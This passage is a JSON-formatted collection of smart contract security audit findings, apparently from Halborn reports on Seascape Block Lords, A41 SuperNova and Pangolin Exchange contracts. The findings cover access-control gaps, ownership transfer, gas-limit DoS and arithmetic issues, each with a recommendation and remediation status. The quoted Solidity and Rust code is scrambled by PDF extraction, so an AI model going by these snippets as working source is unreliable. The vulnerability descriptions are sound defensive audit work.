        "body": "The EVM stack is a maximum of 16 deep. Every variable that is created will get pushed onto the stack. This includes function parameters and local variables. The Lord constructor uses too many parameters and local variables, which causes the following error to be displayed at compile time. Listing 6: StackLimit 1 CompilerError : Stack too deep when compiling inline assembly :  Variable headStart is 1 slot ( s) too deep inside the stack . Code Location: Listing 7: Lord.sol 29 constructor ( 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 address _seedSale , address _strategicSale , address _privateSale , address _launchpads , address _ieo , address _lordsBounty , address _kingsBounty , address _dynastyIncentives , address _liquidity , address _foundationReserve , address _advisor , bool _bridgeAllowed ) ERC20 ( \" BLOCKLORDS \" , \" LORD \") { bridgeAllowed = _bridgeAllowed ; uint256 _million = 1000 * 1000 * 10 ** 18; uint256 thousand = 1000 * 10 ** 18; if (! _bridgeAllowed ) { 17 _mint ( _seedSale , 8 * _million + (750 * thousand )) ; _mint ( _seedSale , 6 * _million + (250 * thousand )) ; // // _mint ( _privateSale , 7 * _million ); _mint ( _launchpads , 2 * _million ); // 8.75% of 100 // 8.75% of 100 _mint ( _ieo , 1 * _million ); _mint ( _lordsBounty , 25 * _million ); // 8.75% of 100 million // 8.75% of 100 // 8.75% of 100 _mint ( _kingsBounty , 10 * _million ); _mint ( _dynastyIncentives , 15 * _million ); // 8.75% of _mint ( _liquidity , 10 * _million ); // 8.75% of 100 _mint ( _foundationReserve , 10 * _million ); // 8.75% of _mint ( _advisor , 5 * _million ); // 8.75% of 100 47  8.75% of 100 million 48  8.75% of 100 million 49  million 50  million 51 52  million 53  million 54  100 million 55  million 56  100 million 57  million 58 59  million tokens \" ); 60 61 } } require ( totalSupply () == 100 * _million , \" not a 100 Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to refactor the parameters of the smart contract constructor. The use of structures containing variables that can be bundled together is recommended. It could also be feasible to execute part of the instructions in a new function called inside the constructor. 18 Remediation Plan: SOLVED: The minting process is now done address by address in several new functions. 19 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords",
            "Severity: Low"
        ]
    },
    {
        "title": "SAFEMATH LIBRARY IS NOT CORRECTLY IMPLEMENTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Lord.sol and Mead.sol smart contracts use .add() and .sub() functions located in the OpenZeppelin SafeMath library. This library is neither imported nor associated to a variable type (in this case uint256), so the mentioned functions cannot be used. Code Location: Listing 8: Lord.sol (Line 93) require ( totalSupply . add ( amount ) <= limitSupply , \" exceeded 92 function mint ( address to , uint256 amount ) external onlyBridge { 93  mint limit \" ); 94 95 _mint ( to , amount ); } Listing 9: Lord.sol (Lines 123,124) 119 function burnFrom ( address account , uint256 amount ) public  onlyBridge { 120  ); 121 uint256 currentAllowance = allowance ( account , _msgSender () require ( currentAllowance >= amount , \" burn amount exceeds  allowance \"); 122 123 124 125 126 } _approve ( account , _msgSender () , currentAllowance . sub ( amount , \" transfer amount exceeds allowance \" )) ; _burn ( account , amount ); Listing 10: Mead.sol (Line 73) function mint ( uint256 _amount , uint8 _v , bytes32 _r , bytes32 63  _s ) external { 20 bytes32 hash bytes32 message address recover = \" \\ x19Ethereum Signed Message :\\ = keccak256 ( abi . encodePacked ( prefix // investor , project verification bytes memory prefix 64 65  n32 \" ; 66 = keccak256 ( abi . encodePacked ( msg .  sender , address ( this ) , chainid , _amount , mintId , mintNonceOf [ msg .  sender ]) ); 67  , message )); 68 69 70 71 72  mint limit \" ); 73 74 75 76 77 require ( bridges [ recover ], \" sig \" ); require ( _totalSupply . add ( amount ) <= limitSupply , \" exceeded = ecrecover ( hash , _v , _r , _s ); _mint ( msg . sender , _amount ); mintNonceOf [ msg . sender ]++; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to import the OpenZeppelin SafeMath.sol library and set the variables that are using that SafeMath. This could be done by adding the following lines to the contracts. Listing 11: safemath.sol 1 import \" @openzeppelin / contracts / utils / math / SafeMath . sol \" ; 2 using SafeMath for uint256 ; 21 Remediation Plan: SOLVED: The SeaScape Team now implements correctly the SafeMath library. 22 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords",
            "Severity: Low"
        ]
    },
    {
        "title": "TOTALSUPPLY VALUE SHOULD BE OBTAINED BY TOTALSUPPLY(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Lord.sol and Mead.sol smart contracts use _totalSupply variable to This value is defined as a private obtain the tokens total supply. variable in the OpenZeppelin ERC20 implementation; therefore, it should be obtained by using the get method totalSupply(). Code Location: Listing 12: Lord.sol 59 require ( totalSupply == 100 * _million , \" not a 100 million tokens \" )  ; Listing 13: Lord.sol 93 require ( totalSupply . add ( amount ) <= limitSupply , \" exceeded mint  limit \" ); Listing 14: Mead.sol 73 require ( _totalSupply . add ( amount ) <= limitSupply , \" exceeded mint  limit \" ); Risk Level: Likelihood - 2 Impact - 2 23 Recommendation: It is recommended to use the get method totalSupply() to retrieve the token total supply. Remediation Plan: SOLVED: The SeaScape team now uses the totalSupply() method to retrieve the total token supply. 24 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords",
            "Severity: Low"
        ]
    },
    {
        "title": "UNDEFINED VARIABLES ARE USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Lord.sol, Mead.sol and ImportExportElasticNft.sol smart contracts use undefined variables, resulting in contracts which do not compile. Code Location:  limitSupply (Lord.sol#93)  bridgeAllowed (Mead.sol#36,46)  amount (Mead.sol#73)  memory_amount (Mead.sol#98)  chainid (Mead.sol#67,90) Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to declare all used variables. In the case of the chain ID variable, it is recommended to recalculate it each time it is used because its value could change in case of a fork. For this purpose, block.chainid could be used instead of creating a variable. Remediation Plan: SOLVED: The SeaScape Team now implements the mentioned variables. 25 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords",
            "Severity: Low"
        ]
    },
    {
        "title": "ONLYBRIDGE MODIFIER IS NEVER USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The onlyBridge modifier is never used in the code. Code Location: Listing 15: Mead.sol 25 26 27 28 modifier onlyBridge { require ( bridges [ msg . sender ]) ; _ ; } Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to remove or comment the unused code from the contracts. Remediation Plan: SOLVED: The SeaScape Team now uses the onlyBridge modifier on the mint and burn functions. 26 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords",
            "Severity: Informational"
        ]
    },
    {
        "title": "SEEDSALE ADDRESS RECEIVES GREATER AMOUNT THAN INTENDED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Several amounts are minted to the accounts, added as arguments in the constructor. Different amounts are minted twice in the _seedsale account, making this account 15 million instead of 8.75 million. Code Location: Listing 16: Lord.sol (Lines 50,51) 29 constructor ( 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  8.75% of 100 million 48  8.75% of 100 million 49  million 50  million address _seedSale , address _strategicSale , address _privateSale , address _launchpads , address _ieo , address _lordsBounty , address _kingsBounty , address _dynastyIncentives , address _liquidity , address _foundationReserve , address _advisor , bool _bridgeAllowed ) ERC20 ( \" BLOCKLORDS \" , \" LORD \") { bridgeAllowed = _bridgeAllowed ; uint256 _million = 1000 * 1000 * 10 ** 18; uint256 thousand = 1000 * 10 ** 18; if (! _bridgeAllowed ) { _mint ( _seedSale , 8 * _million + (750 * thousand )) ; _mint ( _seedSale , 6 * _million + (250 * thousand )) ; _mint ( _privateSale , 7 * _million ); _mint ( _launchpads , 2 * _million ); // 8.75% of 100 // 8.75% of 100 // // 27 _mint ( _ieo , 1 * _million ); _mint ( _lordsBounty , 25 * _million ); // 8.75% of 100 million // 8.75% of 100 // 8.75% of 100 _mint ( _kingsBounty , 10 * _million ); _mint ( _dynastyIncentives , 15 * _million ); // 8.75% of _mint ( _liquidity , 10 * _million ); // 8.75% of 100 _mint ( _foundationReserve , 10 * _million ); // 8.75% of _mint ( _advisor , 5 * _million ); // 8.75% of 100 require ( totalSupply () == 100 * _million , \" not a 100 51 52  million 53  million 54  100 million 55  million 56  100 million 57  million 58 59  million tokens \" ); 60 61 } } Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended that you review the amounts that are minted to each account. Remediation Plan: SOLVED: The seedsale address now receives the correct amount of tokens. 28 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTION STATE CAN BE RESTRICTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The state mutability of the burn() function can be restricted to pure. Code Location: Listing 17: Lord.sol 104 105 106 function burn ( uint256 amount ) public { require ( false , \" Only burnFrom is allowed \" ); } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to restrict the state of the function to pure for saving gas. Remediation Plan: SOLVED: The SeaScape team has removed the affected function. 29 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords",
            "Severity: Informational"
        ]
    },
    {
        "title": "ACCESS CONTROL NOT ENFORCED FOR CREATING PAIRS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As explicated in the provided documentation, the instruction for pair creation in the factory contract should be only called by the factorys owner. However, the code does not reflect the documentation because there is no check if msg.sender is the factorys owner in the function execute_create_pair. With this, anyone can create liquidity pools, that should be created by the factorys owner. Proof of Concept: In the following link is included a walkthrough video with the proof of concept. Code Location: Fragment of execute_create_pair: Listing 1: contracts/factory/contract.rs 146 fn execute_create_pair ( deps : DepsMut , 147 env : Env , 148 pair_type : PairType , 149 asset_infos : [ AssetInfo ; 2] , 150 151 init_params : Option < Binary >, 152 ) -> Result < Response , ContractError > { 153 154 155 156 157 asset_infos [0]. check ( deps . api ) ?; asset_infos [1]. check ( deps . api ) ?; if asset_infos [0] == asset_infos [1] { return Err ( ContractError :: DoublingAssets {}) ; 12 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 } } let config = CONFIG . load ( deps . storage ) ?; if PAIRS . may_load ( deps . storage , & pair_key (& asset_infos )) ? . is_some () { } return Err ( ContractError :: PairWasCreated {}) ; // Get pair type from config let pair_config = PAIR_CONFIGS . load ( deps . storage , pair_type . to_string () ) . map_err (| _| ContractError :: PairConfigNotFound {}) ?; // Check if pair config is disabled if pair_config . is_disabled { return Err ( ContractError :: PairConfigDisabled {}) ; } Risk Level: Likelihood - 5 Impact - 4 Recommendation: The msg.sender should be checked in the function execute_create_pair to be the factorys owner. Remediation Plan: SOLVED: The issue was fixed in commit 7560afb6d5f53a911f3df92bb7fec88d1099ba02. 13 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "SLIPPAGE NOT ENFORCED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the pair liquidity providing functionality in the pair contract, there is no maximum threshold being asserted to the liquidity pool. This can severely affect users amount of token received in return of the provided liquidity. In the code, there is a commented call to a assert_slippage_tolerance function that has not been implemented. Code Location: Fragment of provide_liquidity: Listing 2: contracts/pair/contract.rs (Lines 330,331) 312 if amp == MINIMUM_AMP && !pools [0]. amount . is_zero () && !pools  [1]. amount . is_zero () { 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 let reserve_a = Uint256 :: from ( pools [0]. amount ); let reserve_b = Uint256 :: from ( pools [1]. amount ); let amount_a = Uint256 :: from ( deposits [0]) ; let amount_b = Uint256 :: from ( deposits [1]) ; let real_amount_b = reserve_b * amount_a / reserve_a ; let real_amount_a = reserve_a * amount_b / reserve_b ; let optimal_amount_b = Uint128 :: try_from ( real_amount_b ) ?; let optimal_amount_a = Uint128 :: try_from ( real_amount_a ) ?; if deposits [1] > optimal_amount_b { deposits [1] = optimal_amount_b ; } else if deposits [0] > optimal_amount_a { deposits [0] = optimal_amount_a ; } } // Assert that slippage tolerance is respected 14 331 // assert_slippage_tolerance (& slippage_tolerance , & deposits , &  pools ) ?; 332 333 334 // decimals of each token . let token_precision_0 = query_token_precision (& deps . querier ,  pools [0]. info . clone () ) ?; 335 let token_precision_1 = query_token_precision (& deps . querier ,  pools [1]. info . clone () ) ?; 336 let greater_precision = token_precision_0 . max (  token_precision_1 ); 337 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Enforce the use of a default maximum threshold when users add liquidity to the pairs. Remediation Plan: RISK ACCEPTED: The A41 team accepted the risk for this finding. 15 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "POOL PAUSE MECHANISM NOT IMPLEMENTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There is no mechanism implemented to pause the pools in the pair or factory contract. It is important to have such mechanism in case an incident occur involving some pool in the protocol. Risk Level: Likelihood - 1 Impact - 4 Recommendation: Implement a way to pause a liquidity pool in the contracts. Remediation Plan: SOLVED: The issue was fixed in commit f01837f816fb6b6eba8ca099dbc9030f14f9a261. 16 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An incorrect use of the update_owner function from the factory contract could set the owner to an invalid address, unwillingly losing control of the contract, which cannot be undone in any way. Currently, the owner of the contracts can change its address using the aforementioned function in a single transaction and without confirmation from the new address. Code Location: Listing 3: contracts/factory/contract.rs let mut config = CONFIG . load ( deps . storage ) ?; return Err ( ContractError :: Unauthorized {}) ; 110 fn execute_update_owner ( deps : DepsMut , 111 info : MessageInfo , 112 new_owner : String , 113 114 ) -> Result < Response , ContractError > { 115 116 117 118 119 120 121 122 123 124 } 125 if info . sender ! = config . owner { } } config . owner = deps . api . addr_validate ( new_owner . as_str () ) ?; CONFIG . save ( deps . storage , & config ) ?; Ok ( Response :: new () . add_attribute ( \" action \" , \" update_owner \")) Risk Level: Likelihood - 1 Impact - 4 17 Recommendation: The update_owner function should follow a two steps process, being split into set_owner and accept_owner functions. The latter one requiring the transfer to be completed by the recipient, effectively protecting the contract against potential typing errors compared to single-step owner transfer mechanisms. Remediation Plan: SOLVED: The issue was fixed in commit 428f3ab553cc54bf5e50d65366e3de4eee466bd7. 18 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "UNCHECKED ARITHMETIC",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During our analysis, it was found the use of unchecked multiplications and divisions in multiple source files. This could potentially lead to panic the contracts execution under some scenarios without showing users the reason of the error. It is worth to mention that this issue was classified as informational because the flag overflow-checks has been set to true in the Cargo.toml file. Unsafe math was found in the following files and functions:  contracts/vault/contract.rs: execute_claim  contracts/pair/contract.rs: provide_liquidity  contracts/pair/utils.rs: compute_offer_amount  contracts/pair/utils.rs: assert_max_spread  contracts/pair/utils.rs: start_changing_amp  contracts/pair/utils.rs: compute_current_amp  contracts/pair/utils.rs: get_share_in_assets Code Location: Fragment of execute_claim: Listing 4: contracts/vault/contract.rs (Line 101) 92 93 94 95 96 97 98 99 100 update_pool ( & deps . querier , deps . storage , env . clone () , & mut vault_info , None , ) ?; let reward_per_share = vault_info . reward_per_share . div (  multiplier () ); 19 101 let pending_reward = user_info . amount * reward_per_share -  user_info . reward_debt ; 102 103 104 105 106 107 108 } // check pool has enough balance to send a reward let pool_reward = query_asset_balance ( & deps . querier , env . contract . address , config . rewar Fragment of execute_claim: Listing 5: contracts/vault/contract.rs (Lines 46,47) // ask => offer offer_pool : Uint128 , offer_precision : u8 , ask_pool : Uint128 , ask_precision : u8 , ask_amount : Uint128 , commission_rate : Decimal , amp : u64 , 29 pub fn compute_offer_amount ( 30 31 32 33 34 35 36 37 ) -> StdResult <( Uint128 , Uint128 , Uint128 ) > { 38 39 40 41  greater_precision ) ?; 42  greater_precision ) ?; 43  greater_precision ) ?; 44 45 46  one_minus_commission ; 47  inv_one_minus_commission ; 48 49 50 51 52 offer_pool . u128 () , ask_pool . u128 () , let offer_amount = Uint128 :: new ( calc_offer_amount ( let greater_precision = offer_precision . max ( ask_precision ); let offer_pool = adjust_precision ( offer_pool , offer_precision , let ask_pool = adjust_precision ( ask_pool , ask_precision , let ask_amount = adjust_precision ( ask_amount , ask_precision , let one_minus_commission = Decimal :: one () - commission_rate ; let inv_one_minus_commission : Decimal = Decimal :: one () / let before_commission_deduction = ask_amount * 20 before_commission_deduction . u128 () , amp , ) . unwrap () , ); 53 54 55 56 57 58 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: In release mode, Rust does not panic on overflows and overflown values just wrap without any explicit feedback to the user. It is recommended then to use vetted safe math libraries for arithmetic operations con- sistently throughout the smart contract system. Consider replacing the multiplication operator with Rusts checked_div method, the multiplica- tion operator with Rusts checked_mul method, and so on. Remediation Plan: ACKNOWLEDGED: The A41 Team acknowledged this finding. 21 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "INCOMPLETE DOCUMENTATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/A41_SuperNova_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The documentation provided is incomplete. For instance, the documentation included in the GitHub repository should include a contract diagram, instructions for users on how to interact with the contracts, list of the contracts with usage purpose and a walkthrough on how to deploy and test the smart contracts. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider updating the documentation in GitHub for clarifying data flow and work of the contract for the users and greater ease when contracts are deployed and tested. Have a Non-Developer or QA resource work through the process to make sure it addresses any gaps in the set-up steps due to technical assumptions. Remediation Plan: ACKNOWLEDGED: The A41 Team acknowledged this finding. 22 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "A41_SuperNova_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "MINT FUNCTION IS MISSING MOVEDELEGATES CALL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Png contract, the function mint() does not call the _moveDelegates  () function: Listing 1: PNG.sol 184 function mint ( address dst , uint rawAmount ) external returns ( bool )  { 185 186 187 188 189 } require ( msg . sender == minter && minter != address (0) , \" Png ::  mint : unauthorized \" ); uint96 amount = safe96 ( rawAmount , \" Png :: mint : amount exceeds  96 bits \" ); _mintTokens ( dst , amount ); return true ; Listing 2: PNG.sol 421 function _mintTokens ( address dst , uint96 amount ) internal { 422 require ( dst != address (0) , \" Png :: _mintTokens : cannot mint to  the zero address \" ); 423 424 425 426 427 428 429 } totalSupply = SafeMath . add ( totalSupply , uint ( amount )) ; balances [ dst ] = add96 ( balances [ dst ], amount , \" Png :: _mintTokens  : mint amount overflows \" ); emit Transfer ( address (0) , dst , amount ); require ( totalSupply <= maxSupply , \" Png :: _mintTokens : mint  result exceeds max supply \"); This causes that every time Png tokens are minted the users will have to manually call delegate() passing their own address as parameter so their voting power is correctly accounted/updated in the smart contract: 13 Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to add the _moveDelegates() function call into the _mintTokens() function. Remediation Plan: SOLVED: bbbf14abf0283fa7ea3ccf07288fecdc177ed8f9. Pangolin team solved the issue in the commit id 14 ",
        "labels": [
            "Halborn",
            "Pangolin_Exchange",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF TRANSFEROWNERSHIP PATTERN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "All functions that involve some kind of transfer of ownership require a single step, which is to set up the new privileged address. If this designated EOA account is not a valid account, it is very possible that the transfer of ownership will be made to an uncontrolled account, losing access to privileged functions. Code location: PNG.sol Listing 3: PNG.sol (Line 267) 264 function setMinter ( address newMinter ) external returns ( bool ) { 265 266 267 268 269 } require ( msg . sender == admin , \" Png :: setMinter : unauthorized \" ); emit MinterChanged ( minter , newMinter ); minter = newMinter ; return true ; Listing 4: PNG.sol (Line 280) 276 function setAdmin ( address newAdmin ) external returns ( bool ) { 277 278 require ( msg . sender == admin , \" Png :: setAdmin : unauthorized \" ); require ( newAdmin != address (0) , \" Png :: setAdmin : cannot make  zero address the admin \"); emit AdminChanged ( admin , newAdmin ); admin = newAdmin ; return true ; 279 280 281 282 } 15 Airdrop.sol Listing 5: Airdrop.sol (Line 73) 70 function setOwner ( address owner_ ) external { 71 require ( owner_ != address (0) , ' Airdrop :: setOwner : invalid new  owner '); require ( msg . sender == owner , ' Airdrop :: setOwner : unauthorized '  ); owner = owner_ ; 72 73 74 } Listing 6: Airdrop.sol (Line 81) 79 80 81 82 function setWhitelister ( address addr ) external { require ( msg . sender == owner , ' Airdrop :: setWhitelister :  unauthorized '); whitelister = addr ; } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to implement a two-step process where the owner nominates an account and the nominated account must call an acceptOwnership() function for the transfer of ownership to succeed. This ensures the nominated EOA account is a valid and active account. Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk: - Airdrop events will last for a short time, and it is expected that ownership will only be transferred once from the deployer to the multisig. - PNG Ownership will only be transferred from the deployer to the Timelock 16 contract (contracts/governance/Timelock.sol). This Timelock contract has the suggested two-step ownership transfer pattern, and any additional change of ownership would likely go through Timelock rather than PNG. 17 ",
        "labels": [
            "Halborn",
            "Pangolin_Exchange",
            "Severity: Medium"
        ]
    },
    {
        "title": "DOS WITH BLOCK GAS LIMIT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract TreasuryVester the distribute() function is used to distribute the tokens to recipients based on their allocation: TreasuryVester.sol Listing 7: TreasuryVester.sol (Line 149) 70 function distribute () public { 71 require ( vestingEnabled , \" TreasuryVester :: distribute : vesting  is not enabled \"); require ( 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 block . timestamp >= lastUpdate + VESTING_CLIFF , \" TreasuryVester :: distribute : it is too early to distribute  \" ); lastUpdate = block . timestamp ; // defines a vesting schedule that lasts for 30 months if ( step % STEPS_TO_SLASH == 0) { uint slash = step / STEPS_TO_SLASH ; if ( slash < 5) { _vestingPercentage = _initialVestingPercentages [ slash  ]; } else if ( slash < 12) { _vestingPercentage -= 20; } else if ( slash < 20) { _vestingPercentage -= 15; } else if ( slash < 30) { _vestingPercentage -= 10; } else { revert ( \" TreasuryVester :: distribute : vesting is over \" ); } _vestingAmount = getVestingAmount () ; } step ++; // distributes _vestingAmount of tokens to recipients based on 18  their allocation for ( uint i ; i < _recipientsLength ; i ++) { Recipient memory recipient = _recipients [ i ]; uint amount = recipient . allocation * _vestingAmount /  DENOMINATOR ; if (! recipient . isMiniChef ) { // simply mints or transfer tokens to regular  recipients vestedToken . mint ( recipient . account , amount ); } else { // calls fund rewards of minichef after minting tokens  to self vestedToken . mint ( address ( this ) , amount ); vestedToken . approve ( recipient . account , amount ); IMiniChefV2 ( recipient . account ). fundRewards ( amount ,  VESTING_CLIFF ); } } emit TokensVested ( _vestingAmount ); 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 } As the length of recipients is not limited, in case that there are too many recipients, the block gas limit could be reached, causing miners to not respond to all distribute() calls, thus blocking the main purpose of the smart contract. Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended to add a require statement in the setRecipients()  function of the TreasuryVester contract that limits the number of recipients. 19 Remediation Plan: SOLVED: 1e2f374c6728b998a22045a673be0ba14156b9c1. Pangolin team solved the issue in the commit id 20 ",
        "labels": [
            "Halborn",
            "Pangolin_Exchange",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the TreasuryVester and Airdrop contracts, the constructors are missing address validation. On the other hand, in some functions it is also critical to perform this validation. For example, in the TreasuryVester  .setRecipients() function, if a 0 address recipient was set the distribute() call would always fail, since most tokens cannot be minted at the 0 address. Each address should be validated and checked to be non-zero. Code location: TreasuryVester.sol Listing 8: TreasuryVester.sol (Line 87) address newVestedToken , uint newStartingBalance , Recipient [] memory newRecipients , address newGuardian 78 constructor ( 79 80 81 82 83 ) { 84 require ( newStartingBalance > 0, \" TreasuryVester :: Constructor :  invalid starting balance \" ); require ( newGuardian != address (0) , \" TreasuryVester ::  Constructor : invalid guardian address \"); guardian = newGuardian ; vestedToken = IPng ( newVestedToken ); startingBalance = newStartingBalance ; setRecipients ( newRecipients ); 85 86 87 88 89 90 } 21 Listing 9: TreasuryVester.sol (Line 187) 170 function setRecipients ( Recipient [] memory newRecipients ) public  onlyOwner { 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 } _recipientsLength = newRecipients . length ; require ( _recipientsLength != 0 , \" TreasuryVester :: setRecipients : invalid recipient number \" ); uint allocations ; for ( uint i ; i < _recipientsLength ; ++ i ) { Recipient memory recipient = newRecipients [ i ]; require ( recipient . account != address (0) , \" TreasuryVester :: setRecipients : invalid recipient  address \" ); require ( recipient . allocation != 0 , \" TreasuryVester :: setRecipients : invalid recipient  allocation \" ); _recipients [ i] = recipient ; allocations += recipient . allocation ; } require ( allocations == DENOMINATOR , \" TreasuryVester :: setRecipients : invalid total allocation \" ); emit RecipientsChanged ( newRecipients ); Airdrop.sol Listing 10: Airdrop.sol (Lines 45-47) 38 constructor ( 39 40 41 42 43 ) { 44 45 uint supply_ , address png_ , address owner_ , address remainderDestination_ airdropSupply = supply_ ; png = png_ ; 22 owner = owner_ ; remainderDestination = remainderDestination_ ; 46 47 48 } Listing 11: Airdrop.sol (Line 62) 57 function setRemainderDestination ( address remainderDestination_ )  external { require ( 58 59 60 61 62 63 } msg . sender == owner , ' Airdrop :: setRemainderDestination : unauthorized ' ); remainderDestination = remainderDestination_ ; PNG.sol Listing 12: PNG.sol (Line 267) 264 function setMinter ( address newMinter ) external returns ( bool ) { 265 266 267 268 269 } require ( msg . sender == admin , \" Png :: setMinter : unauthorized \" ); emit MinterChanged ( minter , newMinter ); minter = newMinter ; return true ; Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that each address input is non-zero. 23 Remediation Plan: SOLVED: 8810acc38f27bf9de25a492ffe41d3c54c657c5f. Pangolin team solved the issue in the commit id 24 ",
        "labels": [
            "Halborn",
            "Pangolin_Exchange",
            "Severity: Low"
        ]
    },
    {
        "title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In some for loops, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: TreasuryVester.sol - Line 149: for (uint i; i < _recipientsLength; i++){ Airdrop.sol - Line 178: for (uint i = 0; i < addrs.length; i++){ Proof of Concept: For example, based in the following test contract: Listing 13: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } 25 We can see the difference in the gas costs: Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This is not applicable outside of loops. Remediation Plan: SOLVED: 4aa439b03eac34bebf40c6b72e9afeb2d0fa2333. Pangolin team solved the issue in the commit id 26 ",
        "labels": [
            "Halborn",
            "Pangolin_Exchange",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNNEEDED INITIALIZATION OF UINT VARIABLES TO ZERO",
